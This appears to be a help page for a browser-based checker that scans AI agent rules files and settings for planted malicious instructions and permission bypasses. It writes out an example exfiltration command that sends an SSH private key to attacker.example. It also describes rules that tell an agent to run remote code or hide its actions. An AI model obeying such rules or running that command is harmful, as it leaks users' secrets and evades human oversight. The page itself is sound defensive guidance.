The mistake

Rules files and agent settings committed to a repo that tell the agent to download and run remote code, send data to a URL, read credential files, hide actions from the user, skip tests or checks; or settings that turn approvals off ("bypassPermissions"), auto-approve broad commands (Bash(curl:*)), enable every project MCP server, or redirect ANTHROPIC_BASE_URL.

Why it is dangerous

curl ... | sh makes the agent execute whatever that server returns, with your permissions and your shell's secrets. Agents run with your credentials and can read your files, so one line is enough for exfiltration. Legitimate project rules never ask the agent to hide what it does. A committed setting that turns approvals off applies to everyone who opens the repo, and Bash(curl:*) also approves curl -d @~/.ssh/id_rsa https://attacker.example.

How to fix it

Delete the instruction or setting and review where it came from. In Claude Code settings, use "defaultMode": "default" or "acceptEdits" instead of "bypassPermissions"; to forbid it for a team, set "permissions": { "disableBypassPermissionsMode": "disable" } in managed settings. Keep allow-lists to specific, harmless commands, and make rules files reviewed code (CODEOWNERS plus a CI check).

FAQ

Which agents' files are checked?

CLAUDE.md, AGENTS.md, .cursorrules and .cursor/rules, .github/copilot-instructions.md, Windsurf / Cline rules and similar, plus Claude Code .claude/settings.json, VS Code settings and Codex config.

Can I check .claude/settings.json here?

Yes. Set the file name to .claude/settings.json in the paste box, or drop the repo folder.

Are my files uploaded anywhere?

No. The checker is Python running inside your browser tab (Pyodide, WebAssembly). Your files are read with the browser's File API and written into an in-memory file system that exists only in this tab. The page makes no network requests except loading the Python runtime and the checker code. There are no analytics. You can disconnect from the internet after the engine has loaded and the scan still works.

Is a clean report a guarantee?

No. It is a static check for known patterns, not a penetration test. A clean report means none of these patterns were found, nothing more.

Can I run the same check on my machine or in CI?

Yes. Every checker on this site is an open-source command-line tool (MIT licence, Python 3.10+ standard library only). The results here are the same as `scan --json` on the command line, except for checks that need git (whether a file is committed or ignored), which cannot run in a browser.
